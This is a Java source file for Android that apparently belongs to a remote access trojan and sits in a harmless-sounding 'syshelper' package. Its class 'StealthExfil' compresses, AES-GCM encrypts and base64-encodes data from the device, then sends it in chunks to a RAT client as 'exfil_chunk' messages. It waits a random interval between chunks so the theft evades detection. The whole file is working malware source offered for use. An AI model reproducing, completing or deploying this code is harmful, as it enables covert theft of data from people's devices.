package com.syshelper.service;
import android.util.Base64;
import android.util.Log;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.zip.Deflater;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class StealthExfil {
    private static final String TAG = "StealthExfil";
    private static final int CHUNK_SIZE = 65536;
    private static final int MAX_DELAY = 45000;
    private static final int MIN_DELAY = 5000;

    public static byte[] compress(byte[] data) {
        Deflater deflater = new Deflater(Deflater.BEST_COMPRESSION);
        deflater.setInput(data);
        deflater.finish();
        ByteArrayOutputStream out = new ByteArrayOutputStream(data.length / 2 + 64);
        byte[] buffer = new byte[8192];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            if (count > 0) out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }

    public static void sendStealthy(RatClient client, String cmd, byte[] data, String fileType, byte[] sessionKey) {
        java.util.concurrent.Executors.newCachedThreadPool().submit(() -> {
            try {
                byte[] compressed = compress(data);
                byte[] encrypted = aesEncrypt(compressed, sessionKey);
                String b64Data = Base64.encodeToString(encrypted, Base64.NO_WRAP);
                int totalChunks = (int) Math.ceil((double) b64Data.length() / CHUNK_SIZE);
                String sessionId = String.valueOf(System.currentTimeMillis());
                java.util.Random random = new java.util.Random();
                for (int i = 0; i < totalChunks; i++) {
                    int start = i * CHUNK_SIZE;
                    int end = Math.min(start + CHUNK_SIZE, b64Data.length());
                    JSONObject chunkObj = new JSONObject();
                    chunkObj.put("type", "exfil_chunk"); chunkObj.put("uid", client.uid);
                    chunkObj.put("session", sessionId); chunkObj.put("cmd", cmd);
                    chunkObj.put("file_type", fileType); chunkObj.put("seq", i);
                    chunkObj.put("total", totalChunks); chunkObj.put("data", b64Data.substring(start, end));
                    client.sendJson(chunkObj);
                    if (i < totalChunks - 1) {
                        int delay = MIN_DELAY + random.nextInt(MAX_DELAY - MIN_DELAY);
                        if (random.nextInt(10) == 0) delay += random.nextInt(30000);
                        Thread.sleep(delay);
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Exfiltration failed: " + e.getMessage()); }
        });
    }

    private static byte[] aesEncrypt(byte[] data, byte[] key) throws Exception {
        byte[] iv = new byte[12];
        SecureRandom.getInstanceStrong().nextBytes(iv);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
        byte[] encrypted = cipher.doFinal(data);
        byte[] tag = Arrays.copyOfRange(encrypted, encrypted.length - 16, encrypted.length);
        byte[] ct = Arrays.copyOfRange(encrypted, 0, encrypted.length - 16);
        return ByteBuffer.allocate(12 + 16 + ct.length).put(iv).put(tag).put(ct).array();
    }
}
